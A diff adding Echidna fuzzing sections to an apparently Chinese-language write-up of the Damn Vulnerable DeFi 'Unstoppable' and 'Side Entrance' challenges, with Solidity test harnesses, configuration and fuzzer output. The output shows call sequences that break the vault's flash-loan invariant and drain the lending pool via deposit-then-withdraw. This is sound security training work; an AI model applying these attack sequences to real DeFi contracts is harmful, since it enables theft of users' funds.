@@ -146,6 +146,79 @@ $ forge remappings
     });
     ```
 
+### Using Echidna
+
+!!! note "contracts/unstoppable/UnstoppableTest.sol"
+
+    ```js
+    // SPDX-License-Identifier: MIT
+    pragma solidity ^0.8.0;
+
+    import "./ReceiverUnstoppable.sol";
+    import "../DamnValuableToken.sol";
+
+    contract UnstoppableTest is IERC3156FlashBorrower {
+
+        DamnValuableToken token;
+        UnstoppableVault vault;
+        
+        uint256 constant TOKENS_IN_VAULT = 1000000e18;
+        uint256 constant INITIAL_PLAYER_TOKEN_BALANCE = 10e18;
+
+        constructor() {
+            token = new DamnValuableToken();
+            vault = new UnstoppableVault(token, msg.sender, msg.sender);
+
+            token.approve(address(vault), TOKENS_IN_VAULT);
+            vault.deposit(TOKENS_IN_VAULT, msg.sender);
+
+            // sending the attacker some tokens
+            token.transfer(address(0x10000), INITIAL_PLAYER_TOKEN_BALANCE);
+        }
+
+        function onFlashLoan(
+            address initiator,
+            address _token,
+            uint256 amount,
+            uint256 fee,
+            bytes calldata
+        ) external returns (bytes32) {
+            require (initiator == address(this) && msg.sender == address(vault) && _token == address(vault.asset()) && fee == 0);
+
+            ERC20(_token).approve(address(vault), amount);
+
+            return keccak256("IERC3156FlashBorrower.onFlashLoan");
+        }
+
+        // check whether UnstoppableLender can always provide flash loans
+        function echidna_test_flashloan() public returns(bool) {
+            vault.flashLoan(this, address(token), 10, "");
+            return true;
+        }
+    }
+    ```
+
+```bash
+$ echidna . --contract UnstoppableTest --all-contracts --sender 0x10000
+...
+echidna_test_flashloan: failed!💥  
+  Call sequence:
+    *wait* Time delay: 392942 seconds Block delay: 1545
+    *wait* Time delay: 389927 seconds Block delay: 9966
+    *wait* Time delay: 414579 seconds Block delay: 12172
+    *wait* Time delay: 322246 seconds Block delay: 65
+    *wait* Time delay: 271329 seconds Block delay: 883
+    *fallback*() from: 0x0000000000000000000000000000000000010000 Time delay: 138756 seconds Block delay: 3281
+    *wait* Time delay: 289607 seconds Block delay: 38344
+    *wait* Time delay: 372714 seconds Block delay: 55396
+
+Event sequence: Transfer() from: 0xb4c79dab8f259c7aee6e5b2aa729821864227e84, error Revert 0x, error Revert 0x
+Unique instructions: 3719
+Unique codehashes: 4
+Corpus size: 1
+Seed: 2655974979073607364
+```
+
 ### 参考资料
 
 - [ERC4626](https://docs.openzeppelin.com/contracts/4.x/api/token/erc20#ERC4626)
@@ -413,6 +486,108 @@ it('Execution', async function () {
     let hacker = await (await ethers.getContractFactory('SideEntranceHacker', player)).deploy(pool.address);
     await hacker.exploit();
 });
+```
+
+### Using Echidna
+
+!!! note "contracts/side-entrance/SideEntranceTest.sol"
+
+    ```js
+    // SPDX-License-Identifier: MIT
+    pragma solidity ^0.8.0;
+
+    import "./SideEntranceLenderPool.sol";
+
+    contract PoolDeployer {
+        // SideEntranceTest contract should not be the owner of the initial funds,
+        // or it can remove the funds by calling withdraw()
+        function deploy() external payable returns (address) {
+            SideEntranceLenderPool pool = new SideEntranceLenderPool();
+            pool.deposit{value: 1000 ether}();
+            return address(pool);
+        }
+    }
+
+    contract SideEntranceTest is IFlashLoanEtherReceiver {
+
+        SideEntranceLenderPool pool;
+
+        bool canWithdraw;
+        bool canDeposit;
+        uint256 depositAmount;
+
+        constructor() payable {
+            PoolDeployer deployer = new PoolDeployer();
+            pool = SideEntranceLenderPool(deployer.deploy{value: 1000 ether}());
+        }
+
+        receive() external payable {}
+
+        function setWithdraw(bool _enabled) public {
+            canWithdraw = _enabled;
+        }
+
+        function setDeposit(bool _enabled, uint256 _amount) public {
+            canDeposit = _enabled;
+            depositAmount = _amount;
+        }
+
+        // IFlashLoanEtherReceiver.execute()
+        function execute() external payable {
+            if (canWithdraw) {
+                pool.withdraw();
+            }
+
+            if (canDeposit) {
+                pool.deposit{value: depositAmount}();
+            }
+        }
+
+        function flashLoan(uint256 _amount) public {
+            pool.flashLoan(_amount);
+        }
+
+        function testBalance() public view {
+            assert(address(pool).balance >= 1000 ether);
+        }
+    }
+    ```
+
+!!! note "side-entrance.yml"
+
+    ```yml
+    testMode: assertion # to check sth as well as changing the state
+    balanceContract: 1000000000000000000000 # 1000 ether
+
+    deployer: "0x10000"
+    psender: "0x10000"
+    contractAddr: "0x10000" # only SideEntranceTest is the sender
+    sender: ["0x10000"]
+    ```
+
+```bash
+$ echidna . --contract SideEntranceTest --config side-entrance.yml 
+...
+execute():  passed! 🎉
+flashLoan(uint256):  passed! 🎉
+setDeposit(bool,uint256):  passed! 🎉
+setWithdraw(bool):  passed! 🎉
+testBalance(): failed!💥  
+  Call sequence:
+    execute() Value: 0x8081
+    setDeposit(true,32768)
+    flashLoan(1)
+    setDeposit(false,0)
+    setWithdraw(true)
+    execute()
+    testBalance()
+
+Event sequence: Panic(1): Using assert.
+AssertionFailed(..):  passed! 🎉
+Unique instructions: 1079
+Unique codehashes: 2
+Corpus size: 9
+Seed: 4893652944378861842
 ```
 
 ## 5. The Rewarder
